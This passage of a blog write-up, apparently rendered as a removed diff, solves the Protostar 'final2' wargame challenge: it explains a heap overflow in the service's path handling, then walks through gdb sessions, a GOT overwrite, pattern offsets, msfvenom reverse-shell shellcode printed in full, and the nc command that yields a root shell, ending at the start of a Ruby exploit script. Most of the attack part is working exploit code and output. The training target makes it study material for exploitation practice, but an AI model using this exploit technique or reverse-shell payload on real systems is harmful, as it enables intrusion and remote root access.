-</span><span class='line'>  <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="cm">/* Wait for socket activity and return */</span>
-</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
-</span><span class='line'>  <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">get_requests</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The vulnerability is in this part of the source:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'>  <span class="n">p</span> <span class="o">=</span> <span class="n">rindex</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">&#39;/&#39;</span><span class="p">);</span>
-</span><span class='line'>  <span class="n">l</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>      <span class="n">start</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&quot;ROOT&quot;</span><span class="p">);</span>
-</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>          <span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">start</span> <span class="o">!=</span> <span class="sc">&#39;/&#39;</span><span class="p">)</span> <span class="n">start</span><span class="o">--</span><span class="p">;</span>
-</span><span class='line'>          <span class="n">memmove</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">l</span><span class="p">);</span>
-</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;moving from %p to %p (exploit: %s / %d)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">start</span> <span class="o">&lt;</span> <span class="n">buf</span> <span class="o">?</span>  <span class="s">&quot;yes&quot;</span> <span class="o">:</span> <span class="s">&quot;no&quot;</span><span class="p">,</span> <span class="n">start</span> <span class="o">-</span> <span class="n">buf</span><span class="p">);</span>
-</span><span class='line'>      <span class="p">}</span>
-</span><span class='line'>  <span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>It expects message with the content <code>..../..ROOT.../next</code>, look for the rightmost <code>/</code>,
-then searching for string <code>ROOT</code> and going leftside, it finds another <code>/</code>.</p>
-
-<p>Finally, it copies <code>/next</code> after the left <code>/</code>, before <code>ROOT</code> and creates <code>..../next\x00T...</code></p>
-
-<p>We need at least one slash, because <code>strlen(NULL)</code> segfaults. The security issue
-is that if we don&rsquo;t set left slash, it continues to the left through different
-chunk, for example:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>1st chunk: "FSRD" + "0" * 123 + "/"
-</span><span class='line'>2nd chunk: "FSRD" + "ROOT/" + [0xfffffff8].pack("V") + [0xfffffffc].pack("V") + "AAAABBBB" + "X" * 103
-</span><span class='line'>3rd chunk: "XXXX"</span></code></pre></td></tr></table></div></figure>
-
-
-<p>In this case we copy everything after <code>ROOT/</code> to the 1st chunk and overwrite the chunk metadata, so we have classic heap overflow.</p>
-
-<p>To verify our concept, we attach to the final2 process as root user:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># window 1:
-</span><span class='line'>root@protostar:/tmp# gdb -q -ex 'set disassembly-flavor intel' -ex 'set follow-fork-mode child' -ex 'set detach-on-fork off' -x /home/user/.gdbinit -ex 'c' -p 1627
-</span><span class='line'>
-</span><span class='line'># window 2:
-</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "FSRD" + "0" * 123 +"/" + "FSRD" + "ROOT/" + [0xfffffff8].pack("V") + [0xfffffffc].pack("V") + "AAAABBBB" + "X" * 107' | nc 0 2993
-</span><span class='line'>
-</span><span class='line'># window 1:
-</span><span class='line'>[New process 2405]
-</span><span class='line'>
-</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
-</span><span class='line'>[Switching to process 2405]
-</span><span class='line'>_______________________________________Current language:  auto
-</span><span class='line'>The current source language is "auto; currently c".
-</span><span class='line'>________________________________________
-</span><span class='line'>     eax:41414141 ebx:B7FD7FF4  ecx:0804C2D6  edx:42424242     eflags:00010246
-</span><span class='line'>     esi:00000000 edi:00000000  esp:BFFFF7E0  ebp:BFFFF828     eip:0804AAEF
-</span><span class='line'>     cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t s Z a P c 
-</span><span class='line'>[007B:BFFFF7E0]---------------------------------------------------------[stack]
-</span><span class='line'>BFFFF810 : 42 42 42 42  41 41 41 41 - 18 E1 04 08  18 E1 04 08 BBBBAAAA........
-</span><span class='line'>BFFFF800 : 88 E0 04 08  FC FF FF FF - 00 00 00 00  10 E1 04 08 ................
-</span><span class='line'>BFFFF7F0 : 00 D5 04 08  00 E0 04 08 - 88 00 00 00  45 BD 04 08 ............E...
-</span><span class='line'>BFFFF7E0 : 00 00 00 00  00 00 00 00 - 28 F8 FF BF  68 B5 04 08 ........(...h...
-</span><span class='line'>[007B:41414141]---------------------------------------------------------[ data]
-</span><span class='line'>41414141 : Error while running hook_stop:
-</span><span class='line'>Cannot access memory at address 0x41414141
-</span><span class='line'>0x0804aaef in free (mem=0x804e008) at final2/../common/malloc.c:3648
-</span><span class='line'>3648  final2/../common/malloc.c: No such file or directory.
-</span><span class='line'>  in final2/../common/malloc.c
-</span><span class='line'>
-</span><span class='line'>gdb> i r eax edx
-</span><span class='line'>eax            0x41414141 0x41414141
-</span><span class='line'>edx            0x42424242 0x42424242
-</span><span class='line'>
-</span><span class='line'>gdb> x /i $eip
-</span><span class='line'>0x804aaef &lt;free+301>:  mov    DWORD PTR [eax+0xc],edx
-</span><span class='line'>
-</span><span class='line'>gdb> x /50x 0x804e010
-</span><span class='line'>0x804e010:    0x30303030  0x30303030  0x30303030  0x30303030
-</span><span class='line'>0x804e020:    0x30303030  0x30303030  0x30303030  0x30303030
-</span><span class='line'>0x804e030:    0x30303030  0x30303030  0x30303030  0x30303030
-</span><span class='line'>0x804e040:    0x30303030  0x30303030  0x30303030  0x30303030
-</span><span class='line'>0x804e050:    0x30303030  0x30303030  0x30303030  0x30303030
-</span><span class='line'>0x804e060:    0x30303030  0x30303030  0x30303030  0x30303030
-</span><span class='line'>0x804e070:    0x30303030  0x30303030  0x30303030  0x30303030
-</span><span class='line'>0x804e080:    0x30303030  0x2f303030  0xfffffff8  0xfffffffc
-</span><span class='line'>0x804e090:    0x41414141  0x42424242  0x58585858  0x58585858
-</span><span class='line'>0x804e0a0:    0x58585858  0x58585858  0x58585858  0x58585858
-</span><span class='line'>0x804e0b0:    0x58585858  0x58585858  0x58585858  0x58585858
-</span><span class='line'>0x804e0c0:    0x58585858  0x58585858  0x58585858  0x58585858
-</span><span class='line'>0x804e0d0:    0x58585858  0x58585858</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We use <code>GOT</code> technique, modifing <code>write</code> and the shellcode will be stored in our first chunk (<code>0x804e010</code>).</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@protostar:/tmp# objdump -TR /opt/protostar/bin/final2 | grep "R_386_JUMP_SLOT.* write"
-</span><span class='line'>0804d41c R_386_JUMP_SLOT   write
-</span><span class='line'>
-</span><span class='line'>(gdb) print /x 0x0804d41c-0x0c
-</span><span class='line'>$1 = 0x804d410</span></code></pre></td></tr></table></div></figure>
-
-
-<p>So we need to write <code>0x804e010</code> to <code>0x804d41c</code>.</p>
-
-<p>To check where are usable data in our buffer, we use metasploit pattern:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># window 1:
-</span><span class='line'>root@protostar:/tmp# gdb -q -ex 'set disassembly-flavor intel' -ex 'set follow-fork-mode child' -ex 'set detach-on-fork off' -x /home/user/.gdbinit -ex 'c' -p 1627
-</span><span class='line'>
-</span><span class='line'># window 2:
-</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "FSRD" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0" + "/" + "FSRD" + "ROOT/" + [0xfffffff8].pack("V") + [0xfffffffc].pack("V") + [0x804d410].pack("V") + [0x804e010].pack("V") + "X" * 107' | nc 0 2993
-</span><span class='line'>
-</span><span class='line'># window 1:
-</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
-</span><span class='line'>[Switching to process 2427]
-</span><span class='line'>_______________________________________________________________________________
-</span><span class='line'>     eax:B7FFEFF4 ebx:B7FE1848  ecx:FFFFFFFF  edx:0013F1CC     eflags:00010286
-</span><span class='line'>     esi:BFFFF91C edi:00000001  esp:BFFFF8AC  ebp:B7FEBFC6     eip:0804E026
-</span><span class='line'>     cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t S z a P c 
-</span><span class='line'>[007B:BFFFF8AC]---------------------------------------------------------[stack]
-</span><span class='line'>BFFFF8DC : FA 90 04 08  FC F8 FF BF - 05 00 00 00  00 00 00 00 ................
-</span><span class='line'>BFFFF8CC : 11 00 20 01  00 00 00 00 - 28 67 E9 B7  08 F9 FF BF .. .....(g......
-</span><span class='line'>BFFFF8BC : B0 FA FF B7  A7 D8 F2 B7 - 01 00 00 00  01 00 00 00 ................
-</span><span class='line'>BFFFF8AC : E7 88 04 08  01 00 00 00 - F0 F8 FF BF  26 06 FF B7 ............&...
-</span><span class='line'>[007B:BFFFF91C]---------------------------------------------------------[ data]
-</span><span class='line'>BFFFF91C : 7B 00 00 00  7B 00 00 00 - 28 67 E9 B7  00 00 00 00 {...{...(g......
-</span><span class='line'>BFFFF92C : 18 FC FF BF  EC FB FF BF - 11 00 20 01  00 00 00 00 .......... .....
-</span><span class='line'>[0073:0804E026]---------------------------------------------------------[ code]
-</span><span class='line'>0x804e026:    cmp    BYTE PTR [ecx+0x61],al
-</span><span class='line'>0x804e029:    cmp    DWORD PTR [ecx+0x62],eax
-</span><span class='line'>0x804e02c:    xor    BYTE PTR [ecx+0x62],al
-</span><span class='line'>0x804e02f:    xor    DWORD PTR [ecx+0x62],eax
-</span><span class='line'>0x804e032:    xor    al,BYTE PTR [ecx+0x62]
-</span><span class='line'>0x804e035:    xor    eax,DWORD PTR [ecx+0x62]
-</span><span class='line'>------------------------------------------------------------------------------
-</span><span class='line'>0x0804e026 in ?? ()
-</span><span class='line'>
-</span><span class='line'>gdb> x /50x 0x804e010
-</span><span class='line'>0x804e010:    0x61413161  0x33614132  0x0804d410  0x61413561
-</span><span class='line'>0x804e020:    0x37614136  0x41386141  0x62413961  0x31624130
-</span><span class='line'>0x804e030:    0x41326241  0x62413362  0x35624134  0x41367241
-</span><span class='line'>0x804e040:    0x62413762  0x39624138  0x41306341  0x63413163
-</span><span class='line'>0x804e050:    0x33634132  0x41346341  0x63413563  0x37634136
-</span><span class='line'>0x804e060:    0x41386341  0x64413963  0x3584d130  0x41326449
-</span><span class='line'>0x804e070:    0x64413364  0x35644134  0x41366441  0x64413764
-</span><span class='line'>0x804e080:    0x39644138  0x00000084  0xfffffff8  0xfffffffc
-</span><span class='line'>0x804e090:    0x0804d410  0x0804e010  0x58585858  0x58585858
-</span><span class='line'>0x804e0a0:    0x58585858  0x58585858  0x58585858  0x58585858
-</span><span class='line'>0x804e0b0:    0x58585858  0x58585858  0x58585858  0x58585858
-</span><span class='line'>0x804e0c0:    0x58585858  0x58585858  0x58585858  0x58585858
-</span><span class='line'>0x804e0d0:    0x58585858  0x58585858</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x61413161
-</span><span class='line'>[*] Exact match at offset 4
-</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x61413561
-</span><span class='line'>[*] Exact match at offset 16
-</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x39644138
-</span><span class='line'>[*] Exact match at offset 116</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Our code starts at pattern offset <code>4</code>. There is also modification in the first <code>12</code> bytes, we use <code>2</code> bytes instruction and skip next <code>10</code> bytes, using <code>\xeb\x0a</code> opcode.</p>
-
-<p>After another segfault, we have in gdb:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@protostar:/tmp# gdb -q -ex 'set disassembly-flavor intel' -ex 'set follow-fork-mode child' -ex 'set detach-on-fork off' -x /home/user/.gdbinit -ex 'c' -p 1627
-</span><span class='line'>
-</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "FSRD" + "Aa0A" + "\xeb\x0a" + "X" * 10 + "a5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0" + "/" + "FSRD" + "ROOT/" + [0xfffffff8].pack("V") + [0xfffffffc].pack("V") + [0x804d410].pack("V") + [0x804e010].pack("V") + "X" *  107' | nc 0 2993
-</span><span class='line'>
-</span><span class='line'>gdb> x /i 0x804e010
-</span><span class='line'>0x804e010:    jmp    0x804e01c
-</span><span class='line'>
-</span><span class='line'>gdb> x /30x 0x804e01c
-</span><span class='line'>0x804e01c:    0x61413561  0x37614136  0x41386141  0x62413961
-</span><span class='line'>0x804e02c:    0x31624130  0x41326241  0x62413362  0x35624134
-</span><span class='line'>0x804e03c:    0x41366241  0x62413762  0x39624138  0x41306341
-</span><span class='line'>0x804e04c:    0x63413163  0x33634132  0x41346341  0x63413563
-</span><span class='line'>0x804e05c:    0x37634136  0x41386341  0x64413963  0x31644130
-</span><span class='line'>0x804e06c:    0x41326441  0x64413364  0x35644134  0x41366441
-</span><span class='line'>0x804e07c:    0x64413764  0x39644138  0x00000084  0xfffffff8
-</span><span class='line'>0x804e08c:    0xfffffffc  0x0804d410
-</span><span class='line'>
-</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "FSRD" + "Aa0A" + "\xeb\x0a" + "X" * 10 + "D" * 107" + "/" + "FSRD" + "ROOT/" + [0xfffffff8].pack("V") + [0xfffffffc].pack("V") + [0x804d410].pack("V") + [0x804e010].pack("V") + "X" *  107' | nc 0 2993
-</span><span class='line'>
-</span><span class='line'>gdb> x /30x 0x804e01c
-</span><span class='line'>0x804e01c:    0x44444444  0x44444444  0x44444444  0x44444444
-</span><span class='line'>0x804e02c:    0x44444444  0x44444444  0x44444444  0x44444444
-</span><span class='line'>0x804e03c:    0x44444444  0x44444444  0x44444444  0x44444444
-</span><span class='line'>0x804e04c:    0x44444444  0x44444444  0x44444444  0x44444444
-</span><span class='line'>0x804e05c:    0x44444444  0x44444444  0x44444444  0x44444444
-</span><span class='line'>0x804e06c:    0x44444444  0x44444444  0x44444444  0x44444444
-</span><span class='line'>0x804e07c:    0x44444444  0x44444444  0x00000084  0xfffffff8
-</span><span class='line'>0x804e08c:    0xfffffffc  0x0804d410</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We can see above, that we have <code>26*4=104</code> bytes for our shellcode.</p>
-
-<p>Exploitation:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># window 1:
-</span><span class='line'>
-</span><span class='line'># we add 0x5c = '/' to our bad chars list
-</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -b '\x0a\x0d\x5c\x00' -f sh
-</span><span class='line'>No platform was selected, choosing Msf::Module::Platform::Linux from the payload
-</span><span class='line'>No Arch selected, selecting Arch: x86 from the payload
-</span><span class='line'>Found 22 compatible encoders
-</span><span class='line'>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
-</span><span class='line'>x86/shikata_ga_nai succeeded with size 95 (iteration=0)
-</span><span class='line'>Payload size: 95 bytes
-</span><span class='line'>export buf=\
-</span><span class='line'>$'\xb8\x23\x99\xa0\xea\xdd\xc0\xd9\x74\x24\xf4\x5f\x2b\xc9'\
-</span><span class='line'>$'\xb1\x12\x31\x47\x12\x03\x47\x12\x83\xe4\x9d\x42\x1f\xdb'\
-</span><span class='line'>$'\x46\x75\x03\x48\x3a\x29\xae\x6c\x35\x2c\x9e\x16\x88\x2f'\
-</span><span class='line'>$'\x4c\x8f\xa2\x0f\xbe\xaf\x8a\x16\xb9\xc7\x73\xe9\x39\x16'\
-</span><span class='line'>$'\xe4\xeb\x39\x1d\xcd\x62\xd8\xad\x4b\x25\x4a\x9e\x20\xc6'\
-</span><span class='line'>$'\xe5\xc1\x8a\x49\xa7\x69\x3a\x65\x3b\x01\x2c\x56\xd9\xb8'\
-</span><span class='line'>$'\xc2\x21\xfe\x68\x48\xbb\xe0\x3c\x65\x76\x62'
-</span><span class='line'>
-</span><span class='line'># window 2:
-</span><span class='line'>user@protostar:/tmp$ export buf=\
-</span><span class='line'>> $'\xb8\x23\x99\xa0\xea\xdd\xc0\xd9\x74\x24\xf4\x5f\x2b\xc9'\
-</span><span class='line'>> $'\xb1\x12\x31\x47\x12\x03\x47\x12\x83\xe4\x9d\x42\x1f\xdb'\
-</span><span class='line'>> $'\x46\x75\x03\x48\x3a\x29\xae\x6c\x35\x2c\x9e\x16\x88\x2f'\
-</span><span class='line'>> $'\x4c\x8f\xa2\x0f\xbe\xaf\x8a\x16\xb9\xc7\x73\xe9\x39\x16'\
-</span><span class='line'>> $'\xe4\xeb\x39\x1d\xcd\x62\xd8\xad\x4b\x25\x4a\x9e\x20\xc6'\
-</span><span class='line'>> $'\xe5\xc1\x8a\x49\xa7\x69\x3a\x65\x3b\x01\x2c\x56\xd9\xb8'\
-</span><span class='line'>> $'\xc2\x21\xfe\x68\x48\xbb\xe0\x3c\x65\x76\x62'
-</span><span class='line'>
-</span><span class='line'># window 3:
-</span><span class='line'>user@protostar:~$ nc -l -p 1337
-</span><span class='line'>
-</span><span class='line'># window 2:
-</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "FSRD" + "Aa0A" + "\xeb\x0a" + "X" * 10 + ENV["buf"] + "D" * (107 - ENV["buf"].length) + "/" + "FSRD" + "ROOT/" + [0xfffffff8].pack("V") + [0xfffffffc].pack("V") + [0x804d410].pack("V") + [0x804e010].pack("V") + "X" *  107' | nc 0 2993
-</span><span class='line'>Process OK
-</span><span class='line'>
-</span><span class='line'># window 3:
-</span><span class='line'>id
-</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><figcaption><span>exploit-final2.rb </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
-</span><span class='line'>
-</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
-</span><span class='line'>
-</span><span class='line'><span class="c1"># user@protostar:~$ objdump -TR /opt/protostar/bin/final2 | grep &quot;R_386_JUMP_SLOT.* write&quot;</span>
-</span><span class='line'><span class="c1"># 0804d41c R_386_JUMP_SLOT   write</span>
-</span><span class='line'>
-</span><span class='line'><span class="c1"># gdb&gt; print /x 0x0804d41c-0xc</span>
-</span><span class='line'><span class="c1"># $1 = 0x804d410</span>
-</span><span class='line'>
-</span><span class='line'><span class="c1"># root@protostar:/tmp# ltrace  -e memset -f /opt/protostar/bin/final2 </span>
-</span><span class='line'><span class="c1"># [pid 2803] +++ exited (status 0) +++</span>
-</span><span class='line'><span class="c1"># [pid 2804] memset(0xbffff71c, &#39;\000&#39;, 16)     = 0xbffff71c</span>
-</span><span class='line'><span class="c1"># [pid 2807] memset(0x0804e008, &#39;\000&#39;, 132)    = 0x0804e008 &lt;= first chunk</span>
-</span><span class='line'><span class="c1"># [pid 2807] memset(0x0804e090, &#39;\000&#39;, 132)    = 0x0804e090 &lt;= second chunk</span>
-</span><span class='line'><span class="c1"># [pid 2807] memset(0x0804e118, &#39;\000&#39;, 132)    = 0x0804e118 &lt;= third chunk</span>
-</span><span class='line'>
-</span><span class='line'><span class="c1"># root@kali32:~# ruby -e &#39;puts &quot;0x&quot;+(0x0804e008+&quot;FSDRAa0A&quot;.length).to_s(16)&#39;</span>
-</span><span class='line'><span class="c1"># 0x804e010</span>
-</span><span class='line'>
-</span><span class='line'><span class="c1"># root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -b &#39;\x0a\x0d\x5c\x00&#39; -f ruby</span>
-</span><span class='line'><span class="c1"># No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span>
-</span><span class='line'><span class="c1"># No Arch selected, selecting Arch: x86 from the payload</span>
-</span><span class='line'><span class="c1"># Found 22 compatible encoders</span>
-</span><span class='line'><span class="c1"># Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span>
-</span><span class='line'><span class="c1"># x86/shikata_ga_nai succeeded with size 95 (iteration=0)</span>
-</span><span class='line'><span class="c1"># Payload size: 95 bytes</span>
-</span><span class='line'><span class="n">buf</span> <span class="o">=</span>
